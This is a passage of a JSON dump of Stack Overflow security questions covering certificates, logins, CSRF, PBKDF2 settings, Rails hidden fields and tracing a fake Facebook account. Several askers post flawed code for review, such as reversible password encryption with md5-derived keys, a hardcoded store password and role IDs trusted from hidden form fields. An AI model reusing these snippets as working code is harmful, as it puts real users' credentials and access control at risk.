SecureRandom.GetInstance(\"SHA1PRNG\"));\n\n// Ok, now we have a BouncyCastle certificate, we need to convert it to the \n// System.Security.Cryptography class, by writing it out to disk and reloading\nX509Certificate2 dotNetCert;\n\nstring tempStorePassword = \"Password01\"; // In real life I'd use a random password\nFileInfo tempStoreFile = new FileInfo(Path.GetTempFileName());\n\ntry\n{\n    Pkcs12Store newStore = new Pkcs12Store();\n\n    X509CertificateEntry entry = new X509CertificateEntry(cert);\n\n    newStore.SetCertificateEntry(Environment.MachineName, entry);\n\n    newStore.SetKeyEntry(\n        Environment.MachineName,\n        new AsymmetricKeyEntry(keyPair.Private),\n        new [] { entry });\n\n    using (FileStream s = tempStoreFile.Create())\n    {\n        newStore.Save(s, \n            tempStorePassword.ToCharArray(), \n            new SecureRandom(new CryptoApiRandomGenerator()));\n    }\n\n    // Reload the certificate from disk\n    dotNetCert = new X509Certificate2(tempStoreFile.FullName, tempStorePassword);\n}\nfinally\n{\n    tempStoreFile.Delete();\n}\n\n// Now install it into the required certificate stores\nX509Store targetStore = new X509Store(StoreName.My, StoreLocation.LocalMachine);\ntargetStore.Open(OpenFlags.ReadWrite);\ntargetStore.Add(dotNetCert);\ntargetStore.Close();\n</code></pre>\n\n<p>Ok, now I have created and installed the certificate. I then configure my Windows Service to use this certificate by supplying it with the generated certificate's thumbprint. I then use the certificate like this:</p>\n\n<pre><code>// First load the certificate\nX509Certificate2 certificate = null;\n\nX509Store store = new X509Store(StoreName.My, StoreLocation.LocalMachine);\nstore.Open(OpenFlags.ReadOnly);\n\nforeach (X509Certificate2 certInStore in store.Certificates)\n{\n    if (certInStore.Thumbprint == \"...value not shown...\")\n    {\n        certificate = certInStore;\n        break;\n    }\n}\n\nSslStream sslStream = new SslStream(new NetworkStream(socket, false), false);\n\n// Now this line throws a Win32Exception \n// \"The credentials supplied to the package were not recognized\"\nsslStream.AuthenticateAsServer(certificate);\n</code></pre>\n\n<p>Does anyone have any idea what the problem could be here?</p>\n\n<p>I don't get the problem if I install a certificate created with 'makecert', but that isn't suitable for production certificates.</p>\n\n<p>I've also tried creating a separate x509v1 CA certificate and then x509v3 certificate for server authentication, but I get the same error, so I removed this in the example code for simplicity.</p>\n"},{"tags":["php","security","login"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":82,"score":2,"question_id":12716119,"title":"PHP Login system -- am I doing it right?","body":"<p>I'm kind of new to this stuff, but this is my login authorization page.</p>\n\n<pre><code>function encrypt($password, $salt) {\n    return base64_encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_256, md5($salt), $password, MCRYPT_MODE_CBC, md5(md5($salt))));\n}\n\n$query = \"SELECT * FROM users WHERE LOWER(`username`) = :user\";\n$stmt = $dbh-&gt;prepare($query);\n$stmt-&gt;bindValue(':user', strtolower($_POST['username']));\n$stmt-&gt;execute();\n\nif ($stmt-&gt;rowCount() == 1) {\n    $row = $stmt-&gt;fetch(PDO::FETCH_ASSOC);\n    if (encrypt($_POST['password'], $row['salt']) == $row['password']) {\n        echo \"Logged in!\";\n    }\n}\n</code></pre>\n\n<p>In my database, I have columns <code>username</code>, <code>password</code>, and <code>salt</code>. The password column contains the encrypted password.</p>\n\n<p>Is my workflow correct here?</p>\n"},{"tags":["c#",".net","security","windows-7","uac"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12710775,"title":"Starting an Application as Administrator from another one","body":"<p>I'm a little lost here.</p>\n\n<p>I have an App, let's call it App1.</p>\n\n<p>App1 works fine. In some cases, App1 needs to execute another program, App2.</p>\n\n<p>The code is simple:</p>\n\n<pre><code>           /*call app2*/\n            ProcessStartInfo startInfo = new ProcessStartInfo(Convert.ToString(ConfigurationManager.AppSettings[\"pathActualizador\"]));\n\n            startInfo.UseShellExecute = false;\n\n            try\n            {\n                System.Diagnostics.Process.Start(startInfo);\n            }\n            catch (ArgumentException)\n            {\n                MessageBox.Show(\"Error en parármetros enviados al Actualizador..\", Properties.Resources.txtTituloAplicacion, MessageBoxButtons.OK, MessageBoxIcon.Information);\n            }\n\n            /*close app1 and letting app2 do its work*/\n            Application.ExitThread();\n</code></pre>\n\n<p>In some cases, I've problem with the authorization for calling app2.\nApp1 is a simple system, app2 needs to create, move and delete some files and folders (that's why is giving me trouble)\nAt least, we solve it executing as an administrator de app2, by right click --> properties --> execute as administrator.</p>\n\n<p>I'm trying to solve this.\nI've read many posts, about creating a manifest file here in SO.\nSo, I created one.\nI added the new item from Application project --> add new item --> app.manifest</p>\n\n<p>And by the default created, only changed this</p>\n\n<pre><code>&lt;requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\" /&gt;\n</code></pre>\n\n<p>THIS MANIFEST is for App1.\nWe have both apps in like 100 computers, and we can't  change it one by one (most of them are in another country)\nBut we have an application to modify, sending some commands throw Internet, the app1.\nSo, I've read that if a process create another one, this new process will have the same ExecutionLevel that its parent. So, adding the manifest in App1, when it creates Process for App2, should execute as Administrator</p>\n\n<p>I'm right or not?</p>\n\n<p>By the other hand, I've added the manifest, compiled, and sent the .exe and .manifest to a client, run, and I still have the same problem: The app2 cannot access to folders to modify them, returning a problem of  privileges. </p>\n\n<p>Is there something wrong ? I've to create a manifest for the App2 instead? This is kinda difficult, also is difficult to configure windows for each machine..</p>\n\n<p>I've read that I can also do something like</p>\n\n<pre><code>startInfo.Verb = \"runas\";\n</code></pre>\n\n<p>but also read that in the future (said this in 2008) that this could be ignored, and the only way will be using manifest. So I want to avoid this option</p>\n\n<p>edit: Using Visual Studio 2010, .NET 3.5</p>\n\n<p>edit2: I've tried \"runas\", also not working. The user is no administrator, so has no rights of administrator</p>\n"},{"tags":["iphone","ios","xcode","security","authentication"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":12712260,"title":"Storing authentication token on iOS","body":"<p>I am building an iOS application and the user authenticates with my web service. I don't want them to login every time the app launches (the token lasts a month). So I'd like to cache this on the device somewhere. </p>\n\n<p>What's the best way to do this, securely?</p>\n\n<p>Can I just rely on the app remaining suspended and keeping the token in 'memory'?</p>\n"},{"tags":["asp.net","security","sharepoint","authorization"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":69,"score":2,"question_id":12422458,"title":"Building ASP.Net custom authorization against database without MVC","body":"<p>this is my first request, so don´t be too hard. :)</p>\n\n<p>We are building an Sharepoint 2010 - Application, which consists of some Sharepoint Web Parts and many ASP.Net-Sites. Therefore we are limited to use ASP.Net without MVC. This decision is made and can´t be refused.</p>\n\n<p>We are using Windows Authentification with Impersonation. The Users are stored in an application database. Along with the users there are roles which have rights to specific objects and specific actions. all these informations are stored in the custom database.</p>\n\n<p>The database has a data access layer (EF 4.0). Because Sharepoint is limited to .NET Framework 3.5, the business logic consists of a WCF Data Service which is using the DAL and business logic libary which accessing the WCF Data Service to grab the required information.</p>\n\n<p>The ASP.Net-Pages and Sharepoint Web Parts are directly accessing the business logic.</p>\n\n<p>What i now need is some kind of a Manager-Class which is checking the user against the database to authorize him to access the specific objects. I dont want to do it programmaticly. I want to use annotations to specify if a method from the business layer can be called or not. Furthermore i want to hide some things in the ASP.Net Sites without an programmaticly if-clause.</p>\n\n<p>Can someone give me a hint to achieve this? Is there a way do customize some part of the standard framework to realize it?</p>\n\n<p>The user and his roles and rights i want to store in a session. Is this a good way? the application is accessible only in local network.</p>\n"},{"tags":["asp.net",".net","security","permissions"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12699921,"title":"ASP.NET Creating User Files As Read-Only - How to change this behavior?","body":"<p>I'm hoping someone could help me address a file permissions issue.  I'm having a permissions problem with an ASP.NET Web Application.</p>\n\n<p>When I create a file it creates the file with the Read-Only attribute by default.  So if I attempt to modify or access the file later I get the following error: </p>\n\n<blockquote>\n  <p>System.UnauthorizedAccessException: Access to the path 'Actual Path is\n  here' is denied.</p>\n</blockquote>\n\n<p>I can remove the <code>Read-Only</code> attribute with <code>File.SetAttributes</code>, but this is an extra step.</p>\n"},{"tags":["python","security","session","cryptography","client-side"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":8040843,"title":"Security issues with Itsdangerous for session management?","body":"<p>The content of a signed cookie with Itsdangerous can be inspected but not altered. \nAre there any known security issues or considerations when using <a href=\"http://packages.python.org/itsdangerous/\" rel=\"nofollow\">Itsdangerous</a> for client side session management? </p>\n\n<p>The session in question will not store any passwords, but obviously some information to identify the user, such as </p>\n\n<ul>\n<li>User ID</li>\n<li>URL to avatar</li>\n<li>User role(s)</li>\n</ul>\n"},{"tags":["wordpress","security","hacking"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":12712951,"title":"Is there a way to stop Wordpress attempted hackers?","body":"<p>I have a wordpress installation that keeps locking out an attempted hack on the login page. My security plugin locks out the user and logs the IP. However, it's a dynamic IP and the hacker keeps trying. Can I do anything with the hacker's IP? I've added more security measures, but wonder what the best way is to deal with this?</p>\n"},{"tags":["security","browser","web-security","csrf"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":12703838,"title":"Does disabling third party cookies protect a client against cross site request forgery attacks?","body":"<p>Say that example.org uses cookies to authenticate users and it did not implement cross site request forgery protection. Is an example.org user that disabled third party cookies secured against CSRF attack (assuming that all sensitive requests to example.org require valid authentication cookie to be present)?  If this is not the case, can you give examples illustrating how evil.com can perform sensitive operations in a name of the example.org user?</p>\n"},{"tags":["php","security","session","cookies"],"answer_count":5,"favorite_count":7,"up_vote_count":11,"down_vote_count":0,"view_count":5892,"score":11,"question_id":5435068,"title":"Creating a secure login using sessions and cookies in PHP","body":"<p>I am making a login script that I would like to be as secure as possible. Problem is, security seems to be a never ending battle. So essentially, I am looking for suggestions and improvements to my ideas.</p>\n\n<p>What I have is a login based solely on sessions. Anytime the session information changes, <code>session_regenerate_id()</code> is called to avoid obvious hijacking attempts.</p>\n\n<p>When the session is not set, I check a cookie for valid login, and on success, I update the session.</p>\n\n<p>I attempt to secure the cookie by adding a hash value along with a piece of unique user information (like username or id). This hash is comprised of various information, including the username/id, undecipherable password hash, part of the IP address, etc. By extracting the username/id from the cookie, I can make a new hash from the valid user information and compare that with the hash in the cookie. My hopes here are to prevent fake cookies and cookie hijacking (unless they also spoof the IP address).</p>\n\n<p><strong>EDIT</strong> Assume that the login itself will be done via HTTPS/SSL, so the transfer is (reasonably) secure.</p>\n\n<p>Am I on the right track? What else can be done to secure my login?</p>\n\n<p>Thanks for the help!</p>\n"},{"tags":["jquery","web-services","security"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":39,"score":2,"question_id":12648714,"title":"Web API Security-How to protect student ID when you have to send it via http","body":"<p>I have a WebAPI and I need to send an unique key that identifies the student id. Since I am using an ajax call, I have to send that unique student id to the service to get that student's records. This is visible to the end user via view source or developer tools in some way (either a hidden html field or the url post or get parameter). \nHow can I prevent a student from view-sourcing my scheme and changing the id to another student and thus accessing someone else's data? Or closely related looking at the history and finding out the last student's id and accessing their history?</p>\n"},{"tags":["ios","security","pdf","permissions","cgpdfdocument"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":22,"score":1,"question_id":12709912,"title":"CGPDFDocument and the trailer/encrypt dictionary","body":"<p>I am trying to get access to the /Encrypt dictionary in the Trailer to check permissions on a PDF. CGPDFDocument only gives access to the Info and Root (top level) dictionaries it seems.</p>\n\n<p><strong>CGPDFDocumentGetCatalog</strong>\nCGPDFDocumentGetNumberOfPages\nCGPDFDocumentGetPage\nCGPDFDocumentGetVersion\n<strong>CGPDFDocumentGetInfo</strong>\nCGPDFDocumentGetID</p>\n\n<p>Any ideas on how to get to the file permissions beyond Printing and Copying ?</p>\n\n<p>CGPDFDocumentAllowsCopying\nCGPDFDocumentAllowsPrinting</p>\n"},{"tags":["php","security"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":151,"score":1,"question_id":2887787,"title":"File System and security (PHP)","body":"<p>Consider a simple file upload system written in php. User has access only in admin panel. \n(Not FTP). He may change folder option from 707 to 755 for security issue.\nHow can do this? Can we do this from upload script ? If yes is this a secure application?</p>\n"},{"tags":["php","security","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":12707589,"title":"how to hide the actual download folder location","body":"<p>I have a question in my mind that how <code>mod_rewrite</code> increases the security.</p>\n\n<p>I have a my php file which shows a .pdf file online like <code>www.exaple.com?id=234</code> and it makes a query to database and get the actual folder location.</p>\n\n<p>the actual folder location is <code>uploads/</code> and i am using something like <a href=\"http://stackoverflow.com/questions/10997516/how-to-hide-the-actual-download-folder-location.\">how to hide the actual folder location</a></p>\n\n<p>Now i want to use <code>google docs</code> </p>\n\n<pre><code> echo \"&lt;iframe src=\\\"http://docs.google.com/gview?url=\".root.\"uploads/myfile.pdf\".\"&amp;embedded=true\\\" style=\\\"width:100%; height:100%;\\\" frameborder=\\\"0\\\"&gt;&lt;/iframe&gt;\n</code></pre>\n\n<p>but i don't want to show the upload directory <code>uploads/</code> in this url.So i use <code>module_rewrite</code> to change the directory name to <code>myfiles/</code> .</p>\n\n<p>The question is that when user changes the directory to <code>www.example.com/myfiles/hacking.php</code> than it will also rewrite to <code>uploads/hacking.php</code>.</p>\n\n<p>I am allowing user to upload files.although i am using blacklist but we assume that security holes may present</p>\n"},{"tags":["linux","security","cloud-hosting","sysadmin","configuration-management"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12700877,"title":"What are Secure Server Configurations for web apps?","body":"<p>Developer attempting to be a sysadmin for a cloud server.    </p>\n\n<p>On a Linux server (LAMP stack), what steps need to be taken at a MINIMUM to configure a secure server?  Should I remove the root user?  Should a different port number be used for http, etc.?  What else?  </p>\n\n<p>Looking for the sysadmin version of <a href=\"http://stackoverflow.com/questions/72394/what-should-a-developer-know-before-building-a-public-web-site\">What should a developer know before building a public web site</a></p>\n"},{"tags":["c++","windows","security","ntfs","filter-driver"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12692755,"title":"Can't access reparse point directory of mounted filter driver from user account in windows xp x64 prof","body":"<p>I created a \"special file system\" for a very special security application. </p>\n\n<p>I create a reparse point using an empty directory. Behind this reparse point is a filter driver, which handels the communication between NTFS and a usermode program, which is doing some encryption/decryption and control work (a mixture between FUSE, TrueCrypt, RamDisc,...). The whole thing is native in C/C++ and works fine unter Win7 x64.</p>\n\n<p>Now I have the nice task to make it work for windwos xp x64 professional. When the whole application is running with admin rights it works fine, but when I switch to user account, I can't access the mounted directory.</p>\n\n<p>The mounter and the \"special file system\" (lets name it sfs) are system services and an other app have to run under user account (COM relevant), the mount operation is successfull (when I switch to admin account after mount operation I can access the directory), the other parts of the application works fine too, but the only thing I can't manage is to get access to this very directory.</p>\n\n<p>I gave the \"everyone\" and the users group and the specific user all permissions to the driver, the library(link between driver and sfs), the mounter and the special file system and did a lot in the registry too. I also gave this permissions to the mounted dir (all rigths, owner,...) but nothing works.</p>\n\n<p>The debug outprint shows, that the request for the directory or the files inside never comes to to \"sfs\". It seems, that the IO-Manager never sends someting to this addres. An other problem is, that I can't manage to get all the debug outprints from the OS (boot in local debug mode and use DebugView.exe from SysInternals), but thats another story.</p>\n\n<p>What did I miss? What is the difference between the security system of XP and Win7? Are there any basic restrictions in XP which I don't know?</p>\n\n<p>Please ask if you need snippets of the code.</p>\n\n<p>Any advise or idea is welcome!</p>\n"},{"tags":["php","security","password-protection"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":80,"score":-1,"question_id":12706061,"title":"How to password protect pdf in PHP","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12700974/how-to-password-protect-an-uploaded-pdf-in-php\">How to password protect an uploaded pdf in PHP</a>  </p>\n</blockquote>\n\n\n\n<p>I have a web app where users can upload pdf documents. Is there a php library that I can use to password protect the pdf file? I need the library to preserve all aspects of the original pdf (i.e. size, fonts, resolution, etc).</p>\n"},{"tags":["c#",".net","security"],"answer_count":5,"favorite_count":3,"up_vote_count":9,"down_vote_count":0,"view_count":589,"score":9,"question_id":2373904,"title":"Any coding security issues specific to C#?","body":"<p>In C++ world there is a variety of ways to make an exploitable vulnerability: buffer overflow, unsafe sting handling, various arithmetic tricks, printf issues, strings not ending with '\\0' and many more. Despite most of these problems were solved in java, there are some things to talk about.\nBut is there any list of typical C#-specific coding vulnerabilities? (and not related to .NET platform itself)</p>\n"},{"tags":["php","security","magento"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":12685973,"title":"Magento security issue","body":"<p>I am using a magento for my site. I am facing the some problem with it. After some time a code gets added in the header of the index files. and my site stops working. When I remove that error like (encrypted) code again site works well.</p>\n\n<p>Is there any way to avoid such code injections? I searched on the net but have not got the proper solution.</p>\n"},{"tags":["facebook","security","fake","fakeweb"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12704946,"title":"Facebook Fake Account : Reveal identity","body":"<p>I have this spammer on my facebook account and is really pestering me.I am pretty much sure she/he is from the same college as mine, how can i track and identify , to whom does this account belong to ?</p>\n\n<p>I followed <a href=\"http://www.techampere.com/how_to_track_a_fake_facebook_account/\" rel=\"nofollow\">this link</a> to get the IP of the \"fake account\"\nBut now how can i get the identity of the IP</p>\n\n<p>Say user A has created fake account B , so how can i get the identity of A ?\nHow can i prove that account B belongs to user A ?</p>\n\n<p>Please help , i know this is not a programming language question but i really need this\nThank you.</p>\n"},{"tags":["java","security"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":1634,"score":1,"question_id":4696141,"title":"How can I establish trust in a X.509 certificate issued by an intermediary?","body":"<p>I have an XML document that is digitally signed. I use the XML Digital Signature API to verify the signature. But this document is a SAML 2.0 Assertion that will be used for single sign-on into our web application. As such I need to establish trust in the X.509 certificate used to sign the XML document.</p>\n\n<p>The code I am using to try and establish this trust is:</p>\n\n<pre><code>String filename = System.getProperty(\"java.home\") + \"/lib/security/cacerts\".replace('/', File.separatorChar);\nFileInputStream is = new FileInputStream(filename);\nKeyStore keystore = KeyStore.getInstance(KeyStore.getDefaultType());\nString password = \"changeit\";\nkeystore.load(is, password.toCharArray());\n\nPKIXParameters params = new PKIXParameters(keystore);\nparams.setRevocationEnabled(false);\n\nCertificateFactory certFactory = CertificateFactory.getInstance(\"X.509\");\nCertPath certPath = certFactory.generateCertPath(Arrays.asList(signatureCertificate));\n\nCertPathValidator certPathValidator = CertPathValidator.getInstance(CertPathValidator.getDefaultType());\nCertPathValidatorResult result = certPathValidator.validate(certPath, params);\n\nPKIXCertPathValidatorResult pkixResult = (PKIXCertPathValidatorResult) result;\nTrustAnchor ta = pkixResult.getTrustAnchor();\nX509Certificate cert = ta.getTrustedCert();\n</code></pre>\n\n<p>When run the call to <code>certPathValidator.validate()</code> throws a <code>CertPathValidatorException</code> with the message <code>Path does not chain with any of the trust anchors</code>.</p>\n\n<p>Examining the certificate, it says it has been issued by <code>OU=www.verisign.com/CPS Incorp.by Ref. LIABILITY LTD.(c)97 VeriSign,OU=VeriSign International Server CA - Class 3,OU=VeriSign\\, Inc.,O=VeriSign Trust Network</code>.\nThis is not one of the trust anchors in the JDK's cacerts key store.</p>\n\n<p>However, using IE to inspect a similar certificate's trust chain I see that <code>www.verisign.com/CPS Incorp.</code>'s was issued by <code>VeriSign Class 3 Public Primary CA</code>, which does appear to be one of the trust anchors in the JDK's cacerts key store.</p>\n\n<p>My question: how can I get Java to validate this certificate?</p>\n"},{"tags":["php","security","hash","passwords","pbkdf2"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12696314,"title":"what are appropriate PBKDF2 settings?","body":"<p>I have a few questions about what are appropriate PBKDF2 settings. I googled for answers and came up mostly empty handed. </p>\n\n<p>Basically, I would like to know what are appropriate values for the input pbkdf2.php (found <a href=\"https://defuse.ca/php-pbkdf2.htm\" rel=\"nofollow\">here</a>) considering the state of technology in 2012. What will give me a reasonable expectation that the passwords I encode will not be hackable by non governmental entities for the next few years?</p>\n\n<p>Here is what I am considering:</p>\n\n<pre><code>define(\"PBKDF2_HASH_ALGORITHM\", \"sha512\");\ndefine(\"PBKDF2_ITERATIONS\", 20000);\ndefine(\"PBKDF2_SALT_BYTES\", 512);\ndefine(\"PBKDF2_HASH_BYTES\", 512);\n</code></pre>\n\n<p>I understand that there are many other things that come into play to create good security. Here is a synopsis of other security measures I am using:</p>\n\n<ul>\n<li>12 digit password with at least 2 numbers, 2 letters, and two symbols</li>\n<li>required password changes every 6 months</li>\n<li>php mysqli prepared statements for all database access</li>\n<li>tokens on all my forms</li>\n<li>5 second delay for incorrect logins,</li>\n<li>blacklist after 10 incorrect logins from the same IP</li>\n<li>incorrect logins and blacklist trigger the same response</li>\n<li>HTTPS</li>\n<li>I am using session and I change the session identifier every 10 pages\nand on sensitive pages, every time the page is accessed.</li>\n</ul>\n\n<p>Am I missing anything?</p>\n"},{"tags":["ruby-on-rails","security","hidden-field"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12702828,"title":"ROR3 : hidden_field security","body":"<p><strong>i've this in _form.html.erb:</strong></p>\n\n<pre><code>        &lt;%if current_user.role_id == 1 %&gt;\n\n            &lt;div class=\"combo_box\"&gt;\n                &lt;%= f.label :subscriber %&gt;\n                &lt;%= f.collection_select(:user_id, User.all,:id,:name,{:include_blank=&gt;false}, :class =&gt; 'styled')  %&gt;\n            &lt;/div&gt;\n\n            &lt;div class=\"combo_box\"&gt;\n                &lt;%= f.label :group %&gt;\n                &lt;%= f.grouped_collection_select(:group_id, User.all,:support_agent_groups,:name,:id,:name, {:prompt =&gt; \"-- Select a group --\"}, :class =&gt; 'styled')  %&gt;\n            &lt;/div&gt;\n\n            &lt;div class=\"combo_box\"&gt;\n                &lt;%= f.label :role %&gt;\n                &lt;%= f.collection_select(:role_id, Role.all,:id,:name,{:include_blank=&gt;false}, {:class =&gt; 'styled'})  %&gt;\n            &lt;/div&gt;\n\n            &lt;div class=\"combo_box\"&gt;\n                &lt;%= f.label :subscription %&gt;\n                &lt;%= f.collection_select(:subscription_id, Subscription.all,:id,:name, {:prompt =&gt; \"-- Select a subscription --\"}, {:class=&gt;'styled'})    %&gt;\n            &lt;/div&gt;              \n\n        &lt;% elsif  current_user.role_id == 6  &amp;&amp; @user.role_id != 6 %&gt;\n\n            &lt;%= f.hidden_field :user_id, :value =&gt; current_user.id %&gt;\n\n            &lt;%= f.hidden_field :subscription_id, :value =&gt; current_user.subscription_id %&gt;\n\n\n            &lt;div class=\"combo_box\"&gt;\n                &lt;%= f.label :group %&gt;\n                &lt;%= f.collection_select(:group_id, SupportAgentGroup.where(:user_id =&gt; current_user.id),:id,:name, {:prompt =&gt; \"-- Select a group --\"}, :class =&gt; 'styled')  %&gt;\n            &lt;/div&gt;\n            &lt;div class=\"combo_box\"&gt;\n                &lt;%= f.label :role %&gt;\n                &lt;%= f.collection_select(:role_id, Role.where('id &lt;&gt; ?', 1).where('id &lt;&gt; ?', 6),:id,:name,{:include_blank=&gt;false}, {:class =&gt; 'styled'})  %&gt;\n            &lt;/div&gt;\n\n        &lt;% elsif  current_user.role_id == 6 %&gt;\n\n            &lt;%= f.hidden_field :user_id, :value =&gt; current_user.id %&gt;\n            &lt;%= f.hidden_field :role_id, :value =&gt; current_user.role_id %&gt;\n            &lt;%= f.hidden_field :subscription_id, :value =&gt; current_user.subscription_id %&gt;\n\n\n            &lt;div class=\"combo_box\"&gt;\n                &lt;%= f.label :group %&gt;\n                &lt;%= f.collection_select(:group_id, SupportAgentGroup.where(:user_id =&gt; current_user.id),:id,:name, {:prompt =&gt; \"-- Select a group --\"}, :class =&gt; 'styled')  %&gt;\n            &lt;/div&gt;\n\n        &lt;% else %&gt;\n\n            &lt;%= f.hidden_field :user_id, :value =&gt; current_user.user.id %&gt;\n            &lt;%= f.hidden_field :group_id, :value =&gt; current_user.group_id %&gt;\n            &lt;%= f.hidden_field :subscription_id, :value =&gt; current_user.user.subscription_id %&gt;\n            &lt;%= f.hidden_field :role_id, :value =&gt; current_user.role_id %&gt;\n\n        &lt;% end %&gt; \n</code></pre>\n\n<p>I can view every hidden filed with values on inspect element with firebug option in browser as </p>\n\n<pre><code>&lt;input id=\"user_user_id\" type=\"hidden\" value=\"2\" name=\"user[user_id]\" /&gt;\n</code></pre>\n\n<p>where I can change value <code>2</code> to <code>100/200/....</code></p>\n\n<p>and on submint the new value <code>100/200/...</code> is posted for saving to db and was saved in db.</p>\n\n<p>Am i need to check all the conditions in view and also in controller to find the suitable default values.. or any option to use the hidden_filed to fix this security issue.</p>\n\n<p>Thanks for any help...</p>\n"},{"tags":["windows","security","datetime","licensing","offline"],"answer_count":13,"favorite_count":5,"up_vote_count":8,"down_vote_count":0,"view_count":1621,"score":8,"question_id":3404045,"title":"How to protect software from system date-time changes?","body":"<p>I would like to add licensing system to application. For example: user buys license for 1 month and after that program expires (Kinda Anti-Virus style?).</p>\n\n<p>Problem is that application is supposed to run in systems which may or <strong>may not be connected to internet</strong>, so how to protect from date-time changes?</p>\n\n<p>Storing app startup and close times in encrypted file won't work as date can be changed (with program uptime of 8 hours per day, would be possible to extend license to almost 300% in ideal case - change time to app close time + 1 second before launching program).</p>\n\n<p>Another question - is there any way to protect from software like <a href=\"http://en.wikipedia.org/wiki/Deep_Freeze_(software\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Deep_Freeze_(software</a>)? (maybe scan drivers?)</p>\n\n<p><strong>EDIT:</strong><br>\nI'm currently using smart card to store licensing information and will use code virtualizer on critical functions (I know about making breakpoints on API calls and inspecting passed data - don't need to hide that data, just to ensure things go as planned)</p>\n"},{"tags":["web-services","security","rest","oauth","restful-authentication"],"answer_count":2,"favorite_count":15,"up_vote_count":12,"down_vote_count":0,"view_count":7343,"score":12,"question_id":4817643,"title":"How to secure RESTful web services?","body":"<p>I have to implement secure <a href=\"https://www.ibm.com/developerworks/webservices/library/ws-restful/\" rel=\"nofollow\">RESTful web services</a>. I already did some research using Google but I'm stuck.</p>\n\n<p>Options:</p>\n\n<p>TLS (HTTPS) +</p>\n\n<ul>\n<li>HTTP Basic (pc1oad1etter)</li>\n<li>HTTP Digest </li>\n<li><a href=\"http://stackoverflow.com/questions/4239846/2-legged-oauth-and-rest\">two-legged</a> OAuth</li>\n<li><a href=\"http://stackoverflow.com/questions/319530/restful-authentication\">a Cookie-based approach</a></li>\n<li>client certificates (Tom Ritter and <a href=\"http://stackoverflow.com/questions/1522368/solutions-to-web-service-client-certificates-auth-best-practices\">here</a>)</li>\n<li>Signed requests using <a href=\"http://en.wikipedia.org/wiki/HMAC\" rel=\"nofollow\">HMAC</a> and <a href=\"http://s3.amazonaws.com/doc/s3-developer-guide/RESTAuthentication.html\" rel=\"nofollow\">a limited lifetime</a></li>\n</ul>\n\n<p>Are there more possible options to consider? If OAuth then what version? Does it even matter? From what I've read so far <a href=\"http://tools.ietf.org/pdf/draft-ietf-oauth-v2-12.pdf\" rel=\"nofollow\">OAuth 2.0</a> with bearer tokens (that is without signatures) seems to be <a href=\"http://hueniverse.com/2010/09/oauth-bearer-tokens-are-a-terrible-idea/\" rel=\"nofollow\">insecure</a>.</p>\n\n<p>I've found another very interesting article on <a href=\"http://www.berenddeboer.net/rest/authentication.html\" rel=\"nofollow\">REST based authentication</a>.</p>\n"},{"tags":["security","authentication","iis","ssl","certificate"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":65,"score":0,"question_id":12701295,"title":"require client certificates in IIS without requiring SSL","body":"<p>In IIS 7, I've created an https binding for a site, and I'd like to require client certificates for https and still keep my http endpoint. </p>\n\n<p>That is to say, I'd like to require client certificates for my https endpoint without requiring SSL across the board and disallowing access to my http endpoint (via \"require SSL\" in SSL Settings). Is this possible?</p>\n"},{"tags":["php","security","passwords","protect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12700974,"title":"How to password protect an uploaded pdf in PHP","body":"<p>I have a web app where users can upload pdf documents. Is there a php library that I can use to password protect the pdf file? I need the library to preserve all aspects of the original pdf (i.e. size, fonts, resolution, etc).</p>\n"},{"tags":["security","encryption","hash","salt"],"answer_count":4,"favorite_count":16,"up_vote_count":21,"down_vote_count":0,"view_count":8093,"score":21,"question_id":1191112,"title":"Password hashing, salt and storage of hashed values","body":"<p>Suppose you were at liberty to decide how hashed passwords were to be stored in a DBMS.  Are there obvious weaknesses in a scheme like this one?</p>\n\n<p>To create the hash value stored in the DBMS, take:</p>\n\n<ul>\n<li>A value that is unique to the DBMS server instance as part of the salt,</li>\n<li>And the username as a second part of the salt,</li>\n<li>And create the concatenation of the salt with the actual password,</li>\n<li>And hash the whole string using the SHA-256 algorithm,</li>\n<li>And store the result in the DBMS.</li>\n</ul>\n\n<p>This would mean that anyone wanting to come up with a collision should have to do the work separately for each user name and each DBMS server instance separately.  I'd plan to keep the actual hash mechanism somewhat flexible to allow for the use of the new <a href=\"http://www.schneier.com/blog/archives/2009/07/sha-3_second_ro.html\">NIST</a> standard hash algorithm (<a 